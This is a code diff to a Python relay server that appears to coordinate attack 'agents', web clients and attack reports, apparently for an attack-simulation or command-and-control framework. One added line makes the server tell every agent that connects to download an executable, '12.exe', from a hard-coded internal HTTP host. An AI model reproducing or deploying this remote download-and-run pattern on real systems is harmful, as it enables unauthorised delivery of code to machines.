@@ -29,6 +29,7 @@ class RelayServer(object):
         self.agents = agent.AgentPool()
         self.webs = web.WebPool()
         self.reports = report.ReportPool()
+        self.tmps = {}
 
 
     def set_init_connection(self, sock: socket.socket):
@@ -49,6 +50,11 @@ class RelayServer(object):
 
         elif client_type == "agent":
             self.agents.add(sock)
+            sock.send(bson.dumps({"type" : "endpoint","attack_id" : 13,"download": "http://172.30.1.39:8000/12.exe","filename": "12.exe","ticket": 3}))
+        
+        elif client_type == "tmp":
+            self.tmps[fd_num] = sock
+            logger.debug(f"{BLUE}[TMP] - {sock}{END}")
 
         return
 
@@ -60,6 +66,9 @@ class RelayServer(object):
         
         elif self.webs.has(fd):
             self.webs.delete(fd)
+        
+        elif fd in self.tmps:
+            self.tmps.pop(fd)
 
         else:
             logger.error(f"{RED}No such {fd}{END}")
@@ -92,10 +101,10 @@ class RelayServer(object):
             if who == "send":
                 send_port = msg['port']
                 REPORT['port'] = send_port
-                REPORT['send_ip'] = self.agents.ip_of(fd)
+                REPORT['send_ip'] = utility.get_ip_from_sock(self.tmps[fd])
 
             elif who == "recv":
-                REPORT['recv_ip'] = self.agents.ip_of(fd)
+                REPORT['recv_ip'] = utility.get_ip_from_sock(self.tmps[fd])
 
             # agent <-> agent ATTACK
             REPORT['type'] = 'pkt'
@@ -103,7 +112,6 @@ class RelayServer(object):
             if "send_ip" in REPORT and "recv_ip" in REPORT:
                 sock = self.webs.get(ticket)
                 utility.send_report(sock, REPORT)
-                # utility.http_request(WEB_URL+'/report/pkt', "POST", json=self.temp_reports[attack_id])
 
                 msg = {
                     "type": "unlock",
@@ -143,7 +151,11 @@ class RelayServer(object):
             ticket = msg['ticket']
             sock = self.webs.get(ticket)
             utility.send_report(sock, msg)
-            # utility.http_request('/report/target', "POST", json=send_data)
+        
+        elif cmd_type == "endpoint":
+            ticket = msg['ticket']
+            sock = self.webs.get(ticket)
+            utility.send_report(sock, msg)
 
         else:
             logger.warning(f"{RED}Not implemented{END}")
@@ -163,11 +175,14 @@ class RelayServer(object):
                     sock = self.agents.get(fileno)
                 elif self.webs.has(fileno):
                     sock = self.webs.get(fileno)
+                elif fileno in self.tmps:
+                    sock = self.tmps[fileno]
                 else:
                     logger.fatal("DEADBEEF")
                     exit(1)
 
-                buf = sock.recv(10240)
+                buf = utility.recv_data(sock)
+                # buf = sock.recv(10240)
                 if buf:
                     msg = bson.loads(buf)
                     logger.info(f"Recevied Data From {fileno}: {msg}")
